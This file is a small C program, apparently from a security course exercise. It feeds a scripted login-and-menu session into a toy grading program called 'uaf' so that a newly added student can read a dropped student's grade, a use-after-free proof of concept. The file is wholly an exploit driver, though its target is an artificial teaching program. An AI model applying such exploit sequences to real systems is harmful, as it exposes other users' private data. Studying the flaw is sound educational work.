#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <error.h>
#include <sys/wait.h>
/*
To run this code:
g++ -Wall -o uaf UAF.cpp
g++ -Wall -o attackcode attackcode.cpp
./attackcode
*/
int main()
{
    int status = system(
        //Prof logs in
        "echo 'Prof\n"
        "Prof123\n"
        //Submit grades
        "1\n"
        "Assignment1\n"
        "80\n"
        "90\n"
        "70\n"
        "85\n"
        "75\n"
        //Logout without publishing grades
        "4\n"
        //Existing Student logs in
        "Mark\n"
        "Mark123\n"
        //Drops class
        "2\n"
        //Prof logs in
        "Prof\n"
        "Prof123\n"
        //Adds new student to class
        "3\n"
        "Jenny\n"
        "Jenny123\n"
        //Publishs Grades
        "2\n"
        "yes\n"
        //Logs out
        "4\n"
        //New student logs in
        "Jenny\n"
        "Jenny123\n"
        //Checks grades to see Mark's Grade
        "1' | ./uaf");


    if (status == -1)
    {
        error(0, errno, "System call failed to execute");
        return 1;
    }

    if (!WIFEXITED(status) || WEXITSTATUS(status) == 127)
    {
        error(0, errno, "Command failed to execute or not found");
        return 1;
    }

    if (WEXITSTATUS(status) != 0)
    {
        error(0, 0, "Command returned a non-zero exit code: %d", WEXITSTATUS(status));
        return 1;
    }

    return 0;
}
